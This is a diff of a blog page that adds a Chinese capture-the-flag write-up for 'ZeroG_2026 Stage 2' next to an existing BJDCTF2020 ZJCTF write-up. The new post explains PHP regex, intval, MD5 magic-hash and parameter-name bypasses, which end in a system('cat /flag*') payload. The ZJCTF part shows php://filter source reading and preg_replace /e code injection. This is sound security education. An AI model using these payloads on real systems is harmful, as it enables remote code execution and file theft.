@@ -1773,6 +1773,8 @@
       
         
       
+        
+      
     
     
     
@@ -1820,6 +1822,36 @@
 
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../php-%E6%BA%90%E7%A0%81/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PHP 源码
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
             
               
                 
@@ -2406,6 +2438,136 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-10-28 00:00:00+00:00">2026-10-28</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="./" class="md-meta__link">RCE</a>, 
+              <a href="../%E5%BC%B1%E7%B1%BB%E5%9E%8B/" class="md-meta__link">弱类型</a>, 
+              <a href="../php-%E6%BA%90%E7%A0%81/" class="md-meta__link">PHP 源码</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="zerog_2026stage-2"><a class="toclink" href="../../zerog2026-stage2/">ZeroG_2026（Stage 2）</a></h2>
+<p>三层，一层比一层贴源码。</p>
+<p><img alt="源码" src="../../../assets/images/zerog2026-stage2/01-source.png" /></p>
+<h3 id="_1"><a class="toclink" href="../../zerog2026-stage2/#_1">第一层：正则 + 严格不等</a></h3>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="x">if (isset($_GET['zero'])</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="x">    &amp;&amp; preg_match('/^ZeroG 2026!$/', $_GET['zero'])</span>
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="x">    &amp;&amp; $_GET['zero'] !== 'ZeroG 2026!') {</span>
+</span></code></pre></div>
+<p>审计代码第一层：正则里的 <code>^</code> 意味着从第一个字符就要匹配，<code>$</code> 意味着到这里就要终止，所以原字符串要是 <code>ZeroG 2026!</code>，但是后面又要 <code>!==</code>（严格不等）。</p>
+<p>这里补充 PCRE 的 <code>$</code>：<strong>它除了匹配字符串末尾，还可以匹配"末尾换行之前"</strong>，所以在末尾加上 <code>\n</code> 也可以，这样就绕过了第一层。</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>?zero=ZeroG%202026!%0A
+</span></code></pre></div>
+<h3 id="intval"><a class="toclink" href="../../zerog2026-stage2/#intval">第二层：intval 和算术运算用两套规则</a></h3>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="x">if (intval($_GET['xp']) &lt; 2026 &amp;&amp; intval($_GET['xp'] + 4) &gt; 2030) {</span>
+</span></code></pre></div>
+<p>这里用到了 <code>intval</code>，就系统去补充了一下相关知识：</p>
+<table>
+<thead>
+<tr>
+<th>行为</th>
+<th>例子</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>截断小数点</td>
+<td><code>intval(0.9) = 0</code></td>
+</tr>
+<tr>
+<td>只取前导数字</td>
+<td><code>intval("123abc") = 123</code></td>
+</tr>
+<tr>
+<td><strong>反过来不行</strong></td>
+<td><code>intval("abc123") = 0</code>（不是 123）</td>
+</tr>
+<tr>
+<td>带进制参数 <code>intval($a, $b)</code></td>
+<td><code>$b = 0</code> 时看前缀：<code>0</code> 开头按 8 进制、<code>0x</code> 开头按 16 进制，否则按 10 进制</td>
+</tr>
+</tbody>
+</table>
+<p>接着看到这里：<strong>既要小于 2026，又要加 4 之后大于 2030。</strong></p>
+<p>最开始想的是用字符串改小进制，但这里不行。所以想到用 <code>2025e9</code>：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>intval('2025e9')  = 2025            ← 遇到 e 就直接停了
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>'2025e9' + 4      = 2.025e12        ← 2025×10⁹，算术运算先算完，才交给 intval
+</span></code></pre></div>
+<p><strong>同一个字符串，被两套规则解释：<code>intval()</code> 只认前导整数，算术运算认科学计数法。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>?zero=ZeroG%202026!%0A&amp;xp=2025e9
+</span></code></pre></div>
+<h3 id="_2"><a class="toclink" href="../../zerog2026-stage2/#_2">第三层：弱等于模拟强等于 + 一个 <code>[</code> 的妙用</a></h3>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="x">if (isset($_POST['Welcome__ctf.2026']) &amp;&amp; isset($_POST['mm'])) {</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="x">    $a = $_POST['Welcome__ctf.2026'];</span>
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="x">    $b = $_POST['mm'];</span>
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="x">    if ($a !== $b &amp;&amp; md5($a) == md5($b)) {</span>
+</span></code></pre></div>
+<p><strong>用 <code>==</code>（弱等于）去模拟 <code>!==</code>（强不等）：</strong> 找一组 MD5 值都以 <code>0e</code> 开头的数据：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>QNKCDZO   → md5 = 0e830400451993494058024219903391
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>240610708 → md5 = 0e462097431906509019562562988736854
+</span></code></pre></div>
+<p><strong>两个 <code>0e...</code> 在 <code>==</code> 下都被当成 0 × 10ⁿ = 0，所以相等；但原字符串不同，<code>!==</code> 也成立。</strong></p>
+<p>接着构造：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>Welcome__ctf.2026=QNKCDZO&amp;mm=240610708&amp;code=system('cat /flag*');
+</span></code></pre></div>
+<p><strong>当然没有这么简单 —— 因为 PHP 会把参数名里的 <code>.</code> 转换成 <code>_</code>，所以这个名字根本出不来。</strong></p>
+<p>我也卡在这里很久。</p>
+<h4 id="_3"><a class="toclink" href="../../zerog2026-stage2/#_3">最后发现的东西</a></h4>
+<p>PHP 7.4 的源码逻辑：循环转换 <code>.</code> 和空格，<strong>但是遇到 <code>[</code> 会直接把它替换成 <code>\0</code>（字符串截断符），然后跳出循环</strong>：</p>
+<p><img alt="循环逻辑" src="../../../assets/images/zerog2026-stage2/02-loop.png" /></p>
+<p>跳出循环之后，PHP 认为这是数组语法，会去寻找与之配对的 <code>]</code> —— <strong>但是找不到！</strong></p>
+<p>找不到之后，又会把刚刚的 <code>\0</code> 换回 <code>_</code>，恢复完整字符串：</p>
+<p><img alt="找不到配对的右括号之后的恢复" src="../../../assets/images/zerog2026-stage2/03-restore.png" /></p>
+<p><strong>所以只要把其中一个 <code>_</code> 改成 <code>[</code>，就能让结果刚好等于原来的名字：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>Welcome__ctf.2026   →  循环走完全程 → 点被转 → Welcome__ctf_2026   ✗
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>Welcome_[ctf.2026   →  在 [ 处 break → 点没被处理 → 恢复 [ 为 _ → Welcome__ctf.2026   ✓
+</span></code></pre></div>
+<p><strong>一个字符同时做了两件事：截断循环（让点逃过转换）+ 恢复之后补回那个下划线。</strong></p>
+<p>最终 payload：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>Welcome_[ctf.2026=QNKCDZO&amp;mm=240610708&amp;code=system('cat /flag*');
+</span></code></pre></div>
+<p>拿到 flag。</p>
+<h4 id="cat-flag-cat-flag"><a class="toclink" href="../../zerog2026-stage2/#cat-flag-cat-flag"><code>cat /flag*</code> 和 <code>cat flag*</code> 的区别</a></h4>
+<p><strong>这里试了一下：<code>cat flag*</code> 抓不到，<code>cat /flag*</code> 才能抓到。</strong></p>
+<p><strong>原因是</strong>当前工作目录<strong>。web 进程的 cwd 是网站目录（<code>/var/www/html</code> 之类），而 flag 文件在</strong>根目录 <code>/</code><strong>：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>cat flag*     ← 相对路径，在网站目录里找 → 找不到
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>cat /flag*    ← 绝对路径，从根目录找     → 命中
+</span></code></pre></div>
+<p><strong>同一类问题在上一道题里是反过来的：那次 <code>cat /index.php</code> 失败、<code>cat index.php</code> 成功，因为文件就在 cwd 里。</strong></p>
+<p><strong>所以路径没有好坏，只有</strong>对不对得上文件所在的位置<strong>。</strong></p>
+<h3 id="_4"><a class="toclink" href="../../zerog2026-stage2/#_4">一个版本细节</a></h3>
+<p><strong><code>intval('2025e9')</code> 只在 <strong>PHP 5</strong> 上返回 2025。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>PHP 5:   intval('2025e9') = 2025            ← 遇到 e 就停
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>PHP 7.1: intval('2025e9') = 2025000000000   ← 也认科学计数法了
+</span></code></pre></div>
+<p><strong>我在本地 PHP 7.4 上实测确认过：<code>intval('2025e9')</code> 返回 <code>2025000000000</code>，第一个条件就直接不成立。</strong></p>
+<p><strong>所以这一关只在 PHP 5 的老环境上成立 —— 换个环境，同一个 payload 就废了。</strong></p>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-10-25 00:00:00+00:00">2026-10-25</time></li>
         
           <li class="md-meta__item">
@@ -2431,60 +2593,60 @@
     <h2 id="bjdctf2020-zjctf"><a class="toclink" href="../../bjdctf2020-zjctf/">[BJDCTF2020] ZJCTF，不过如此</a></h2>
 <p><img alt="index.php 源码" src="../../../assets/images/bjdctf-zjctf/01-index.png" /></p>
 <h3 id="text"><a class="toclink" href="../../bjdctf2020-zjctf/#text">第一层：text 限制</a></h3>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="x">$text = $_GET["text"];</span>
-</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="x">$file = $_GET["file"];</span>
-</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>
-</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="x">if(isset($text) &amp;&amp; (file_get_contents($text,'r') === "I have a dream")){</span>
-</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="x">    echo "&lt;br&gt;&lt;h1&gt;".file_get_contents($text,'r')."&lt;/h1&gt;&lt;/br&gt;";</span>
-</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a><span class="x">    if(preg_match("/flag/", $file)){</span>
-</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a><span class="x">        die("Not now!");</span>
-</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a><span class="x">    }</span>
-</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a><span class="x">    include($file);  //next.php</span>
-</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="x">$text = $_GET["text"];</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="x">$file = $_GET["file"];</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="x">if(isset($text) &amp;&amp; (file_get_contents($text,'r') === "I have a dream")){</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="x">    echo "&lt;br&gt;&lt;h1&gt;".file_get_contents($text,'r')."&lt;/h1&gt;&lt;/br&gt;";</span>
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="x">    if(preg_match("/flag/", $file)){</span>
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="x">        die("Not now!");</span>
+</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="x">    }</span>
+</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a><span class="x">    include($file);  //next.php</span>
+</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a><span class="x">}</span>
 </span></code></pre></div>
 <p>审计代码，观察 <code>text</code> 有内容限制才能走到 <code>include</code>。</p>
 <p>而且 <code>file_get_contents($text,'r')</code> 的 <strong>第一个参数是 <code>$text</code> 本身</strong> —— 也就是说 <code>$text</code> 得是一个「能被读取的东西」，不一定是文件路径。</p>
 <p>这里想到用 <strong>data 协议</strong>，让 <code>file_get_contents</code> 直接读到我们指定的字符串：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>/?text=data://text/plain,I have a dream
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>/?text=data://text/plain,I have a dream
 </span></code></pre></div>
 <p><strong>注意</strong>：这一步要让 <code>file_get_contents($text)</code> 返回 <code>I have a dream</code>，不是写文件。</p>
 <h3 id="include-nextphp"><a class="toclink" href="../../bjdctf2020-zjctf/#include-nextphp">第二层：include 把 next.php 执行了</a></h3>
 <p><strong>接着构造：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>/?text=data://text/plain,I have a dream&amp;file=next.php
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>/?text=data://text/plain,I have a dream&amp;file=next.php
 </span></code></pre></div>
 <p><strong>但是页面并没有给出文件内容</strong> —— 因为 <code>include</code> 把 <code>next.php</code> 当成代码执行了，而不是读出来显示。</p>
 <p>所以改用 <strong>php 伪协议</strong> 读源码（<code>convert.base64-encode</code> 让它不被执行）：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>/?text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>/?text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php
 </span></code></pre></div>
 <p><strong>解码后得到 <code>next.php</code> 的源码。</strong></p>
 <h3 id="nextphp"><a class="toclink" href="../../bjdctf2020-zjctf/#nextphp">next.php 源码</a></h3>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
-</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$id</span><span class="p">;</span>
-</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>
-</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a><span class="k">function</span> <span class="nf">complex</span><span class="p">(</span><span class="nv">$re</span><span class="p">,</span> <span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a>    <span class="k">return</span> <span class="nb">preg_replace</span><span class="p">(</span>
-</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a>        <span class="s1">'/('</span> <span class="o">.</span> <span class="nv">$re</span> <span class="o">.</span> <span class="s1">')/ei'</span><span class="p">,</span>
-</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a>        <span class="s1">'strtolower("\\1")'</span><span class="p">,</span>
-</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a>        <span class="nv">$str</span>
-</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a>    <span class="p">);</span>
-</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a><span class="p">}</span>
-</span><span id="__span-52-12"><a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a>
-</span><span id="__span-52-13"><a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$re</span> <span class="o">=&gt;</span> <span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-52-14"><a id="__codelineno-52-14" name="__codelineno-52-14" href="#__codelineno-52-14"></a>    <span class="k">echo</span> <span class="nx">complex</span><span class="p">(</span><span class="nv">$re</span><span class="p">,</span> <span class="nv">$str</span><span class="p">)</span><span class="o">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
-</span><span id="__span-52-15"><a id="__codelineno-52-15" name="__codelineno-52-15" href="#__codelineno-52-15"></a><span class="p">}</span>
-</span><span id="__span-52-16"><a id="__codelineno-52-16" name="__codelineno-52-16" href="#__codelineno-52-16"></a>
-</span><span id="__span-52-17"><a id="__codelineno-52-17" name="__codelineno-52-17" href="#__codelineno-52-17"></a><span class="k">function</span> <span class="nf">getFlag</span><span class="p">(){</span>
-</span><span id="__span-52-18"><a id="__codelineno-52-18" name="__codelineno-52-18" href="#__codelineno-52-18"></a>    <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
-</span><span id="__span-52-19"><a id="__codelineno-52-19" name="__codelineno-52-19" href="#__codelineno-52-19"></a><span class="p">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$id</span><span class="p">;</span>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="k">function</span> <span class="nf">complex</span><span class="p">(</span><span class="nv">$re</span><span class="p">,</span> <span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>    <span class="k">return</span> <span class="nb">preg_replace</span><span class="p">(</span>
+</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>        <span class="s1">'/('</span> <span class="o">.</span> <span class="nv">$re</span> <span class="o">.</span> <span class="s1">')/ei'</span><span class="p">,</span>
+</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a>        <span class="s1">'strtolower("\\1")'</span><span class="p">,</span>
+</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a>        <span class="nv">$str</span>
+</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a>    <span class="p">);</span>
+</span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a><span class="p">}</span>
+</span><span id="__span-36-12"><a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a>
+</span><span id="__span-36-13"><a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$re</span> <span class="o">=&gt;</span> <span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-36-14"><a id="__codelineno-36-14" name="__codelineno-36-14" href="#__codelineno-36-14"></a>    <span class="k">echo</span> <span class="nx">complex</span><span class="p">(</span><span class="nv">$re</span><span class="p">,</span> <span class="nv">$str</span><span class="p">)</span><span class="o">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+</span><span id="__span-36-15"><a id="__codelineno-36-15" name="__codelineno-36-15" href="#__codelineno-36-15"></a><span class="p">}</span>
+</span><span id="__span-36-16"><a id="__codelineno-36-16" name="__codelineno-36-16" href="#__codelineno-36-16"></a>
+</span><span id="__span-36-17"><a id="__codelineno-36-17" name="__codelineno-36-17" href="#__codelineno-36-17"></a><span class="k">function</span> <span class="nf">getFlag</span><span class="p">(){</span>
+</span><span id="__span-36-18"><a id="__codelineno-36-18" name="__codelineno-36-18" href="#__codelineno-36-18"></a>    <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
+</span><span id="__span-36-19"><a id="__codelineno-36-19" name="__codelineno-36-19" href="#__codelineno-36-19"></a><span class="p">}</span>
 </span></code></pre></div>
 <p>先看 <code>foreach</code>：它把 GET 得到的<strong>名字传给 <code>$re</code></strong>，<strong>值传给 <code>$str</code></strong>。</p>
 <p>接着看这个最重要的正则表达式：<code>i</code> 是忽略大小写，<code>e</code> 是 <strong>eval</strong>，<code>(...)</code> 把整个匹配包成了<strong>捕获组 1</strong>，也就是 <code>strtolower</code> 里的 <code>\1</code>；在 PHP 单引号中的 <code>\\1</code> 等效于 <code>\1</code>。</p>
 <h3 id="re"><a class="toclink" href="../../bjdctf2020-zjctf/#re"><code>$re</code> 到底在干什么</a></h3>
 <p><strong><code>$re</code> 就是 URL 里参数的名字，它被直接拼进了正则。</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="x">foreach($_GET as $re =&gt; $str)     // $re = 参数名,$str = 参数值</span>
-</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="x">      ↓</span>
-</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a><span class="x">'/(' . $re . ')/ei'              // 参数名成了正则主体</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="x">foreach($_GET as $re =&gt; $str)     // $re = 参数名,$str = 参数值</span>
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="x">      ↓</span>
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="x">'/(' . $re . ')/ei'              // 参数名成了正则主体</span>
 </span></code></pre></div>
 <p><strong>所以 <code>$re</code> 决定了三件事：</strong></p>
 <table>
@@ -2510,31 +2672,31 @@
 </tbody>
 </table>
 <p><strong>反过来说：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>想要代码执行,必须让 匹配到的内容 = 我们的 payload
-</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>而"匹配到的内容"由 $re 决定
-</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>→ 所以 $re 必须是一个"什么都匹配"的宽泛正则
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>想要代码执行,必须让 匹配到的内容 = 我们的 payload
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>而"匹配到的内容"由 $re 决定
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>→ 所以 $re 必须是一个"什么都匹配"的宽泛正则
 </span></code></pre></div>
 <p><strong>还有两个约束：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>① $re 里不能有 /      → 会把正则模式提前截断
-</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>② $re 不能是 .        → PHP 会把参数名里的 . 换成 _
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>① $re 里不能有 /      → 会把正则模式提前截断
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>② $re 不能是 .        → PHP 会把参数名里的 . 换成 _
 </span></code></pre></div>
 <h3 id="e"><a class="toclink" href="../../bjdctf2020-zjctf/#e"><code>/e</code> 为什么能执行代码</a></h3>
 <p>替换串是 <code>strtolower("\1")</code>。带 <code>e</code> 修饰符时，替换串会<strong>先做反向引用替换，再把结果当成 PHP 代码执行</strong>。</p>
 <p>而 <code>\1</code> 在双引号里，所以只要捕获到的内容带 <code>"</code> 或 <code>${...}</code>，就能跳出字符串变成真代码。</p>
 <p><strong>PHP 5.x 里 <code>${表达式}</code> 会对表达式求值</strong>：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>strtolower("${phpinfo()}")
-</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>           └────┬─────┘
-</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>        执行 phpinfo()
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>strtolower("${phpinfo()}")
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>           └────┬─────┘
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>        执行 phpinfo()
 </span></code></pre></div>
